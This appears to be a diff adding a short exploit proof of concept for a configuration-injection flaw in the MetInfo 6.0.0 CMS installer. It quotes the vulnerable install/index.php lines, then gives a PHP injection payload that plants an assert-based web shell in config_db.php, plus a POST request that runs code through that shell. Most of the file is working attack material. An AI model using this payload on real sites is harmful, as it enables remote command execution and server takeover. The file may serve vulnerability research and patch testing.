@@ -1,0 +1,24 @@
+# By 李在堂
+	
+'''
+In the CMS installation process, the configuration file filtering is not rigorous, you can insert malicious code in the installation process to execute arbitrary commands, and even get Webshell
+	Source:
+		./install/index.php:126-129
+
+			$file = fopen($files, "w");   
+			fwrite($file,$config);  
+			fclose($file);  
+			include_once(ABS_PATH."config.php");  
+
+	Affected software:MetInfo == 6.0.0
+	Software Link: https://www.metinfo.cn/download/
+
+'''
+payload：
+f_');assert($_REQUEST["w"]);//
+exploit:
+http://127.0.0.1/config/config_db.php
+POST 
+w=phpinfo();
+
+
